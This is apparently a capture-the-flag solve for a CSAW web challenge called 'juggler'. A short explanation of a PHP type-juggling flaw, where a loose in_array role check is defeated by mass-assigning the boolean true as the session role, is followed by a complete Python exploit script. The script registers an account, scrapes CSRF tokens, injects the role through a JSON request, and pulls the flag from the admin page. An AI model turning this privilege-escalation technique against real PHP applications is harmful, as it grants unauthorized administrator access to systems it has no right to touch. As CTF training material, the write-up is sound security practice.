And `admin.php` uses **loose** `in_array($_SESSION["role"], $adminRoles)` with random 32-char string roles. Mass assignment lets us set `$_SESSION["role"]` to the boolean `true` → `in_array(true, ["somestring"])` is true in PHP (bool vs string loose comparison). That's the "juggling" of types.

#!/usr/bin/env python3
import re, json, random, string, sys
import requests

BASE = "http://juggler.chal.csaw.io:80"
s = requests.Session()

def csrf(html):
    m = re.search(r'name="csrf_token" value="([0-9a-f]+)"', html)
    assert m, "no csrf token found"
    return m.group(1)

uname = "pwn" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
pw = "pw" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
print("[*] registering", uname)

r = s.get(BASE + "/register.php")
r = s.post(BASE + "/register.php", data={"csrf_token": csrf(r.text), "username": uname, "password": pw})
print("[*] register status", r.status_code)

r = s.get(BASE + "/login.php")
r = s.post(BASE + "/login.php", data={"csrf_token": csrf(r.text), "username": uname, "password": pw})
print("[*] login status", r.status_code, "url:", r.url)

r = s.get(BASE + "/dashboard.php")
print("[*] dashboard status", r.status_code)
tok = csrf(r.text)

payload = {"csrf_token": tok, "username": uname, "role": True}
r = s.post(BASE + "/dashboard.php", data=json.dumps(payload), headers={"Content-Type": "application/json"})
print("[*] update status", r.status_code, r.text)

r = s.get(BASE + "/admin.php")
print("[*] admin status", r.status_code)
print(r.text)
m = re.search(r'csaw\{[^}]*\}', r.text)
if m:
    print("[+] FLAG:", m.group(0))
else:
    print("[-] no flag found")
